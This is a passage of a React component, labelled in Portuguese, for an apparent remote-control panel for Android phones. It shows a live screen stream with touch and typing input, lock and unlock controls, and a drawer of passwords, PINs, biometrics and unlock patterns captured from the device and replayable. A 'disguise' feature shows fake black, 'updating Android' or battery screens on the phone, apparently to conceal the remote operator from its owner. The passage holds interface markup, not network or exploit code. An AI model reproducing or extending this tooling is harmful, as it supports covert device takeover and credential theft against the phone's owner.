                fontSize: "10px",
                fontWeight: 700,
                cursor: "pointer",
                display: "flex",
                alignItems: "center",
                gap: "4px"
              }}
              title="Menu Esquerdo: Pastas Principal (DVIEW) e Island, e ferramentas de hardware"
            >
              <Folder size={11} />
              <span>Pastas</span>
            </button>

            {/* Toggle Right Sidebar Drawer: Telas */}
            <button
              type="button"
              onClick={() => setOpenRightDrawer(openRightDrawer === "telas" ? null : "telas")}
              style={{
                background: openRightDrawer === "telas" ? "rgba(0, 229, 255, 0.2)" : "#131826",
                border: `1px solid ${openRightDrawer === "telas" ? "#00e5ff" : "#1e293b"}`,
                color: openRightDrawer === "telas" ? "#00e5ff" : "#cbd5e1",
                borderRadius: "4px",
                padding: "3px 7px",
                fontSize: "10px",
                fontWeight: 700,
                cursor: "pointer",
                display: "flex",
                alignItems: "center",
                gap: "4px"
              }}
              title="Menu Direito: Telas no celular (Tela preta, Atualizando Android, Bateria, Imagem)"
            >
              <ImageIcon size={11} />
              <span>Telas</span>
            </button>

            {/* Toggle Right Sidebar Drawer: Senhas */}
            <button
              type="button"
              onClick={() => setOpenRightDrawer(openRightDrawer === "senhas" ? null : "senhas")}
              style={{
                background: openRightDrawer === "senhas" ? "rgba(168, 85, 247, 0.25)" : "#131826",
                border: `1px solid ${openRightDrawer === "senhas" ? "#a855f7" : "#1e293b"}`,
                color: openRightDrawer === "senhas" ? "#c084fc" : "#cbd5e1",
                borderRadius: "4px",
                padding: "3px 7px",
                fontSize: "10px",
                fontWeight: 700,
                cursor: "pointer",
                display: "flex",
                alignItems: "center",
                gap: "4px"
              }}
              title="Menu Direito: Senhas, Biometria, PIN e Padrão de desbloqueio gravados ao usar"
            >
              <Key size={11} />
              <span>Senhas {credentials.length > 0 && `(${credentials.length})`}</span>
            </button>
          </div>
        )}

        {/* Ações da Janela (Pin, Popout, Minimize, Close) */}
        <div style={{ display: "flex", alignItems: "center", gap: "3px" }}>
          {/* PIN */}
          <button
            type="button"
            className={`tactical-floating-btn ${isPinned ? "active-pin" : ""}`}
            onClick={() => {
              setIsPinned(!isPinned);
              showToast(!isPinned ? "Janela fixada no topo!" : "Janela desafixada");
            }}
            title={isPinned ? "Desafixar do topo" : "Fixar no topo (Sempre visível)"}
            style={{
              background: isPinned ? "rgba(255, 26, 42, 0.25)" : "transparent",
              border: `1px solid ${isPinned ? "#ff1a2a" : "transparent"}`,
              color: isPinned ? "#ff4d5a" : "#94a3b8",
              cursor: "pointer",
              borderRadius: "4px",
              padding: "4px"
            }}
          >
            <Pin size={13} style={{ transform: isPinned ? "rotate(45deg)" : "none" }} />
          </button>

          {/* POPOUT DESKTOP */}
          <button
            type="button"
            className="tactical-floating-btn"
            onClick={handlePopoutDesktop}
            title="Desencaixar Janela Desktop (Popout independente)"
            style={{
              background: "transparent",
              border: "none",
              color: "#38bdf8",
              cursor: "pointer",
              borderRadius: "4px",
              padding: "4px"
            }}
          >
            <ExternalLink size={13} />
          </button>

          {/* MINIMIZE */}
          <button
            type="button"
            className="tactical-floating-btn"
            onClick={() => setIsMinimized(!isMinimized)}
            title={isMinimized ? "Restaurar Janela" : "Minimizar"}
            style={{
              background: "transparent",
              border: "none",
              color: "#94a3b8",
              cursor: "pointer",
              borderRadius: "4px",
              padding: "4px"
            }}
          >
            {isMinimized ? <Square size={12} /> : <Minus size={13} />}
          </button>

          {/* CLOSE */}
          <button
            type="button"
            className="tactical-floating-btn close-btn"
            onClick={onClose}
            title="Fechar Instância Flutuante"
            style={{
              background: "transparent",
              border: "none",
              color: "#ef4444",
              cursor: "pointer",
              borderRadius: "4px",
              padding: "4px"
            }}
          >
            <X size={14} />
          </button>
        </div>
      </div>

      {/* 2. CORPO DA JANELA: DOCK ESQUERDO + PAINEL ESQUERDO + TELA CELULAR + PAINEL DIREITO + DOCK DIREITO */}
      {!isMinimized && (
        <div
          className="floating-window-body"
          style={{
            flex: 1,
            display: "flex",
            position: "relative",
            overflow: "hidden",
            background: "#000000",
            minHeight: 0
          }}
        >
          {/* TOAST FLUTUANTE */}
          {toastMsg && (
            <div
              style={{
                position: "absolute",
                top: "8px",
                left: "50%",
                transform: "translateX(-50%)",
                background: "rgba(10, 15, 25, 0.95)",
                border: "1px solid #38bdf8",
                color: "#38bdf8",
                padding: "4px 12px",
                borderRadius: "16px",
                fontSize: "10.5px",
                fontWeight: 700,
                zIndex: 200,
                pointerEvents: "none",
                whiteSpace: "nowrap",
                boxShadow: "0 4px 15px rgba(0,0,0,0.8)"
              }}
            >
              {toastMsg}
            </div>
          )}

          {/* ============================================================== */}
          {/* A. DOCK LATERAL ESQUERDO (ÍCONES RÁPIDOS DAS FUNÇÕES DA ESQUERDA) */}
          {/* ============================================================== */}
          <div
            style={{
              width: "34px",
              background: "#070a12",
              borderRight: "1px solid #1e293b",
              display: "flex",
              flexDirection: "column",
              alignItems: "center",
              padding: "6px 2px",
              gap: "4px",
              zIndex: 30,
              flexShrink: 0
            }}
          >
            {/* Botão Pastas (Principal & Island) */}
            <button
              type="button"
              onClick={() => setOpenLeftDrawer(openLeftDrawer === "pastas" ? null : "pastas")}
              title="Pastas: Principal (DVIEW) e Separada (Island)"
              style={{
                width: "28px",
                height: "28px",
                borderRadius: "5px",
                border: "1px solid",
                borderColor: openLeftDrawer === "pastas" ? "#ff1a2a" : "#1e293b",
                background: openLeftDrawer === "pastas" ? "rgba(255, 26, 42, 0.25)" : "#0d1322",
                color: openLeftDrawer === "pastas" ? "#ff4d5a" : "#cbd5e1",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                cursor: "pointer"
              }}
            >
              <Folder size={14} />
            </button>

            {/* Botão Island Sandbox */}
            <button
              type="button"
              onClick={() => setOpenLeftDrawer(openLeftDrawer === "island" ? null : "island")}
              title="Container Island Sandbox: Validar e Auto-Mirror"
              style={{
                width: "28px",
                height: "28px",
                borderRadius: "5px",
                border: "1px solid",
                borderColor: openLeftDrawer === "island" ? "#38bdf8" : "#1e293b",
                background: openLeftDrawer === "island" ? "rgba(56, 189, 248, 0.25)" : "#0d1322",
                color: openLeftDrawer === "island" ? "#38bdf8" : "#cbd5e1",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                cursor: "pointer"
              }}
            >
              <Boxes size={14} />
            </button>

            {/* Botão Info / Specs */}
            <button
              type="button"
              onClick={() => setOpenLeftDrawer(openLeftDrawer === "info" ? null : "info")}
              title="Informações do Dispositivo & Hardware"
              style={{
                width: "28px",
                height: "28px",
                borderRadius: "5px",
                border: "1px solid",
                borderColor: openLeftDrawer === "info" ? "#22c55e" : "#1e293b",
                background: openLeftDrawer === "info" ? "rgba(34, 197, 94, 0.25)" : "#0d1322",
                color: openLeftDrawer === "info" ? "#22c55e" : "#cbd5e1",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                cursor: "pointer"
              }}
            >
              <ShieldCheck size={14} />
            </button>

            <div style={{ width: "20px", height: "1px", background: "#1e293b", margin: "4px 0" }} />

            {/* Bloquear / Desbloquear tela */}
            <button
              type="button"
              onClick={handleToggleLock}
              title={isScreenLocked ? "Desbloquear tela do aparelho" : "Bloquear tela do aparelho"}
              style={{
                width: "28px",
                height: "28px",
                borderRadius: "5px",
                border: "1px solid #1e293b",
                background: isScreenLocked ? "rgba(239, 68, 68, 0.2)" : "#0d1322",
                color: isScreenLocked ? "#ef4444" : "#94a3b8",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                cursor: "pointer",
                marginTop: "auto"
              }}
            >
              {isScreenLocked ? <Lock size={13} /> : <Unlock size={13} />}
            </button>
          </div>

          {/* ============================================================== */}
          {/* B. PAINEL SLIDE-OUT ESQUERDO (FUNÇÕES DO SIDEBAR ESQUERDO) */}
          {/* ============================================================== */}
          {openLeftDrawer && (
            <FloatingLeftDrawer
              openLeftDrawer={openLeftDrawer}
              setOpenLeftDrawer={setOpenLeftDrawer}
              realApps={realApps}
              handleLaunchApp={handleLaunchApp}
              handleSyncApps={handleSyncApps}
              isSyncingApps={isSyncingApps}
              islandStatus={islandStatus}
              handleValidateIsland={handleValidateIsland}
              isValidatingIsland={isValidatingIsland}
              handleAutoMirror={handleAutoMirror}
              isMirroringIsland={isMirroringIsland}
              handleSeedSyncIsland={handleSeedSyncIsland}
              isSeedSyncingIsland={isSeedSyncingIsland}
              islandFeedback={islandFeedback}
              device={device}
              updateStatus={updateStatus}
              showToast={showToast}
              handleTriggerOtaUpdate={handleTriggerOtaUpdate}
              isUpdatingOta={isUpdatingOta}
              handleToggleLock={handleToggleLock}
              isScreenLocked={isScreenLocked}
            />
          )}

          {/* ============================================================== */}
          {/* C. VIEWPORT CENTRAL: DISPLAY DO SMARTPHONE & TOUCH INTERATIVO */}
          {/* ============================================================== */}
          <div
            className="floating-screen-wrapper"
            style={{
              flex: 1,
              position: "relative",
              display: "flex",
              flexDirection: "column",
              alignItems: "center",
              justifyContent: "center",
              overflow: "hidden",
              background: "#000000",
              minWidth: 0
            }}
          >
            {/* OVERLAY SE DISFARCE ESTIVER ATIVO */}
            {currentDisguise?.active && (
              <div
                style={{
                  position: "absolute",
                  top: "6px",
                  left: "6px",
                  right: "6px",
                  background: "rgba(10, 15, 25, 0.9)",
                  border: "1px solid #38bdf8",
                  borderRadius: "6px",
                  padding: "4px 8px",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "space-between",
                  zIndex: 40
                }}
              >
                <div style={{ display: "flex", alignItems: "center", gap: "6px" }}>
                  <Sparkles size={11} style={{ color: "#38bdf8" }} />
                  <span style={{ fontSize: "9.5px", fontWeight: 800, color: "#fff" }}>
                    TELA ATIVA NO CELULAR: {currentDisguise.type.toUpperCase()}
                  </span>
                </div>
                <button
                  type="button"
                  onClick={handleClearDisguise}
                  style={{
                    background: "rgba(239, 68, 68, 0.2)",
                    border: "1px solid #ef4444",
                    color: "#fca5a5",
                    fontSize: "8.5px",
                    fontWeight: 700,
                    padding: "2px 5px",
                    borderRadius: "3px",
                    cursor: "pointer"
                  }}
                  title="Restaurar visualização normal no aparelho"
                >
                  Desativar
                </button>
              </div>
            )}

            {/* FORMULÁRIO DE DIGITAÇÃO RÁPIDA (VIRTUAL KEYBOARD) */}
            {showQuickType && (
              <form
                onSubmit={handleSendText}
                style={{
                  position: "absolute",
                  top: "8px",
                  left: "8px",
                  right: "8px",
                  background: "#0b101b",
                  border: "1px solid #38bdf8",
                  borderRadius: "6px",
                  padding: "6px",
                  display: "flex",
                  gap: "5px",
                  zIndex: 90,
                  boxShadow: "0 6px 20px rgba(0,0,0,0.8)"
                }}
              >
                <input
                  type="text"
                  autoFocus
                  placeholder="Digitar texto no celular..."
                  value={typeText}
                  onChange={(e) => setTypeText(e.target.value)}
                  style={{
                    flex: 1,
                    background: "#05070a",
                    border: "1px solid #1e293b",
                    borderRadius: "4px",
                    color: "#f8fafc",
                    padding: "4px 7px",
                    fontSize: "11px",
                    outline: "none"
                  }}
                />
                <button
                  type="submit"
                  style={{
                    background: "#0284c7",
                    border: "none",
                    borderRadius: "4px",
                    color: "#fff",
                    padding: "0 8px",
                    cursor: "pointer",
                    display: "flex",
                    alignItems: "center"
                  }}
                >
                  <Send size={11} />
                </button>
                <button
                  type="button"
                  onClick={() => setShowQuickType(false)}
                  style={{
                    background: "#1e293b",
                    border: "none",
                    borderRadius: "4px",
                    color: "#94a3b8",
                    padding: "0 5px",
                    cursor: "pointer"
                  }}
                >
                  <X size={11} />
                </button>
              </form>
            )}

            {/* IMAGEM DA TRANSMISSÃO DA TELA (STREAM EM TEMPO REAL COM CANVAS ZERO-FLICKER) */}
            <div style={{ flex: 1, width: "100%", display: "flex", alignItems: "center", justifyContent: "center", position: "relative", overflow: "hidden" }}>
              <canvas
                ref={canvasRef}
                width={720}
                height={1280}
                onMouseDown={handleMouseDown}
                onMouseUp={handleMouseUp}
                style={{
                  width: "100%",
                  height: "100%",
                  objectFit: "contain",
                  transform: `rotate(${rotationDeg}deg)`,
                  cursor: "crosshair",
                  userSelect: "none",
                  display: "block",
                  imageRendering: "auto"
                }}
              />
              <img
                ref={imgRef}
                src=""
                alt=""
                style={{ display: "none" }}
                aria-hidden="true"
              />

              {/* TOUCH RIPPLES */}
              {ripples.map((r) => (
                <span
                  key={r.id}
                  style={{
                    position: "absolute",
                    left: r.x,
                    top: r.y,
                    width: "28px",
                    height: "28px",
                    borderRadius: "50%",
                    background: "rgba(56, 189, 248, 0.4)",
                    border: "2px solid #38bdf8",
                    transform: "translate(-50%, -50%)",
                    pointerEvents: "none",
                    boxShadow: "0 0 10px #38bdf8"
                  }}
                />
              ))}

              {/* OVERLAY DE RECONEXÃO */}
              {!isStreaming && Date.now() - lastSuccessFrameTimeRef.current > 4000 && (
                <div
                  style={{
                    position: "absolute",
                    inset: 0,
                    background: "rgba(5, 7, 12, 0.85)",
                    display: "flex",
                    flexDirection: "column",
                    alignItems: "center",
                    justifyContent: "center",
                    gap: "8px",
                    zIndex: 10
                  }}
                >
                  <Smartphone size={26} style={{ color: "#f59e0b" }} />
                  <span style={{ fontSize: "10.5px", color: "#cbd5e1" }}>Conectando ao Stream...</span>
                  <button
                    type="button"
                    onClick={() => setScreenTimestamp(Date.now())}
                    style={{
                      background: "#0284c7",
                      border: "none",
                      color: "#fff",
                      borderRadius: "4px",
                      padding: "3px 8px",
                      fontSize: "9.5px",
                      cursor: "pointer"
                    }}
                  >
                    Reconectar
                  </button>
                </div>
              )}
            </div>

            {/* MINI NAVEGADOR VIRTUAL ANDROID (RECENTES, INICIAR, VOLTAR) */}
            <div
              style={{
                width: "100%",
                height: "32px",
                background: "#090d16",
                borderTop: "1px solid #1e293b",
                display: "flex",
                alignItems: "center",
                justifyContent: "space-around",
                zIndex: 20
              }}
            >
              <button
                type="button"
                onClick={() => handleKey("recents", "Recentes")}
                title="Recentes"
                style={{ background: "transparent", border: "none", color: "#94a3b8", cursor: "pointer", padding: "4px" }}
              >
                <Square size={12} />
              </button>
              <button
                type="button"
                onClick={() => handleKey("home", "Home")}
                title="Tela Inicial"
                style={{ background: "transparent", border: "none", color: "#94a3b8", cursor: "pointer", padding: "4px" }}
              >
                <CircleDot size={13} />
              </button>
              <button
                type="button"
                onClick={() => handleKey("back", "Voltar")}
                title="Voltar"
                style={{ background: "transparent", border: "none", color: "#94a3b8", cursor: "pointer", padding: "4px" }}
              >
                <ChevronDown size={13} style={{ transform: "rotate(90deg)" }} />
              </button>
            </div>
          </div>

          {/* ============================================================== */}
          {/* D. PAINEL SLIDE-OUT DIREITO (FUNÇÕES DO SIDEBAR DIREITO) */}
          {/* ============================================================== */}
          {openRightDrawer && (
            <FloatingRightDrawer
              openRightDrawer={openRightDrawer}
              setOpenRightDrawer={setOpenRightDrawer}
              handleQuickUseBiometric={handleQuickUseBiometric}
              isUsingCredId={isUsingCredId}
              quickUnlockMode={quickUnlockMode}
              setQuickUnlockMode={setQuickUnlockMode}
              newPatternPoints={newPatternPoints}
              setNewPatternPoints={setNewPatternPoints}
              handleUseAndRecordPattern={handleUseAndRecordPattern}
              quickPinInput={quickPinInput}
              setQuickPinInput={setQuickPinInput}
              handleUseAndRecordPin={handleUseAndRecordPin}
              credentials={credentials}
              revealedCredIds={revealedCredIds}
              setRevealedCredIds={setRevealedCredIds}
              handleDeleteCredential={handleDeleteCredential}
              handleUseSavedCredential={handleUseSavedCredential}
              currentDisguise={currentDisguise}
              handleActivateDisguise={handleActivateDisguise}
              isActivatingDisguise={isActivatingDisguise}
              handleClearDisguise={handleClearDisguise}
              updatePercent={updatePercent}
              setUpdatePercent={setUpdatePercent}
              SAMPLE_IMAGE_PRESETS={SAMPLE_IMAGE_PRESETS}
              selectedCustomImage={selectedCustomImage}
              setSelectedCustomImage={setSelectedCustomImage}
              isMuted={isMuted}
              setIsMuted={setIsMuted}
              deviceVolume={deviceVolume}
              handleToggleMute={handleToggleMute}
              handleVolumeChange={handleVolumeChange}
              handleSendText={handleSendText}
              typeText={typeText}
              setTypeText={setTypeText}
              MiniPatternSvg={MiniPatternSvg}
            />
          )}

          {/* ============================================================== */}
          {/* E. DOCK LATERAL DIREITO (BARRA ACOPLADA ESTILO MEMU PLAY) */}
          {/* ============================================================== */}
          <div
            className="memu-docked-toolbar"
            style={{
              width: "38px",
              background: "#070a12",
              borderLeft: "1px solid #1e293b",
              display: "flex",
              flexDirection: "column",
              alignItems: "center",
              padding: "6px 2px",
              gap: "4px",
              zIndex: 30,
              flexShrink: 0
            }}
          >
            {/* Botão Senhas & Padrões */}
            <button
              type="button"
              className="memu-tool-btn"
              onClick={() => setOpenRightDrawer(openRightDrawer === "senhas" ? null : "senhas")}
              title="Senhas, Biometria, PIN e Padrão gestual"
              style={{
                width: "30px",
                height: "30px",
                borderRadius: "5px",
                border: "1px solid",
                borderColor: openRightDrawer === "senhas" ? "#a855f7" : "#1e293b",
                background: openRightDrawer === "senhas" ? "rgba(168, 85, 247, 0.25)" : "#0d1322",
                color: openRightDrawer === "senhas" ? "#c084fc" : "#cbd5e1",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                cursor: "pointer"
              }}
            >
              <Key size={14} />
            </button>

            {/* Botão Telas (Disfarces) */}
            <button
              type="button"
              className="memu-tool-btn"
              onClick={() => setOpenRightDrawer(openRightDrawer === "telas" ? null : "telas")}
              title="Telas no Celular (Tela Preta, Atualizando, Bateria, Imagem)"
              style={{
                width: "30px",
                height: "30px",
                borderRadius: "5px",
                border: "1px solid",
                borderColor: openRightDrawer === "telas" ? "#00e5ff" : "#1e293b",
                background: openRightDrawer === "telas" ? "rgba(0, 229, 255, 0.25)" : "#0d1322",
                color: openRightDrawer === "telas" ? "#00e5ff" : "#cbd5e1",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                cursor: "pointer"
              }}
            >
              <ImageIcon size={14} />
            </button>

            {/* Botão Teclado Virtual */}
            <button
              type="button"
              className="memu-tool-btn"
              onClick={() => setShowQuickType(!showQuickType)}
              title="Digitar texto / Teclado Virtual"
              style={{
                width: "30px",
                height: "30px",
                borderRadius: "5px",
                border: "1px solid #1e293b",
                background: showQuickType ? "rgba(56, 189, 248, 0.2)" : "#0d1322",
                color: showQuickType ? "#38bdf8" : "#cbd5e1",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                cursor: "pointer"
              }}
            >
              <Keyboard size={14} />
            </button>

            {/* Botão Volume */}
            <button
              type="button"
              className="memu-tool-btn"
              onClick={() => setOpenRightDrawer(openRightDrawer === "volume" ? null : "volume")}
              title="Ajuste Contínuo de Volume & Mute"
              style={{
                width: "30px",
                height: "30px",
                borderRadius: "5px",
                border: "1px solid",
                borderColor: openRightDrawer === "volume" ? "#38bdf8" : "#1e293b",
                background: openRightDrawer === "volume" ? "rgba(56, 189, 248, 0.25)" : "#0d1322",
                color: openRightDrawer === "volume" ? "#38bdf8" : "#cbd5e1",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                cursor: "pointer"
              }}
            >
              {isMuted ? <VolumeX size={14} style={{ color: "#ef4444" }} /> : <Volume2 size={14} />}
            </button>

            {/* Captura de Tela (Print) */}
            <button
              type="button"
              className="memu-tool-btn"
              onClick={handleDownloadScreenshot}
              title="Tirar Print / Captura de Tela"
              style={{
                width: "30px",
                height: "30px",
                borderRadius: "5px",
                border: "1px solid #1e293b",
                background: "#0d1322",
                color: "#cbd5e1",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                cursor: "pointer"
              }}
            >
              <Camera size={14} />
            </button>

            {/* Rotacionar 90° */}
            <button
              type="button"
              className="memu-tool-btn"
              onClick={() => setRotationDeg((curr) => (curr + 90) % 360)}
              title="Rotacionar Tela 90°"
              style={{
                width: "30px",
                height: "30px",
                borderRadius: "5px",
                border: "1px solid #1e293b",
                background: "#0d1322",
                color: "#cbd5e1",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                cursor: "pointer"
              }}
            >
              <RotateCw size={13} />
            </button>

            {/* Power / Bloquear */}
            <button
              type="button"
              className="memu-tool-btn"
              onClick={() => handleKey("power", "Power")}
              title="Botão Power / Ligar/Desligar Tela"
              style={{
                width: "30px",
                height: "30px",
                borderRadius: "5px",
                border: "1px solid #1e293b",
                background: "#0d1322",
                color: "#f59e0b",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                cursor: "pointer"
              }}
            >
              <Power size={13} />
            </button>

            <div style={{ width: "20px", height: "1px", background: "#1e293b", margin: "3px 0" }} />

            {/* Popout Desktop */}
            <button
              type="button"
              className="memu-tool-btn"
              onClick={handlePopoutDesktop}
              title="Desencaixar Janela Desktop (Popout independente)"
              style={{
                width: "30px",
                height: "30px",
                borderRadius: "5px",
                border: "1px solid rgba(56, 189, 248, 0.4)",
                background: "rgba(56, 189, 248, 0.15)",
                color: "#38bdf8",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                cursor: "pointer",
                marginTop: "auto"
              }}
            >
              <ExternalLink size={13} />
            </button>
          </div>

          {/* F. RESIZE HANDLE NO CANTO INFERIOR DIREITO */}
          <div
            onMouseDown={handleResizeMouseDown}
            style={{
              position: "absolute",
              right: 0,
              bottom: 0,
              width: "16px",
              height: "16px",
              cursor: "nwse-resize",
              zIndex: 99,
              display: "flex",
              alignItems: "center",
              justifyContent: "center"
            }}
            title="Arraste para redimensionar"
          >
            <div
              style={{
                width: "6px",
                height: "6px",
                borderRight: "2px solid #64748b",
                borderBottom: "2px solid #64748b"
              }}
            />
          </div>
        </div>
      )}
    </div>
  );
}
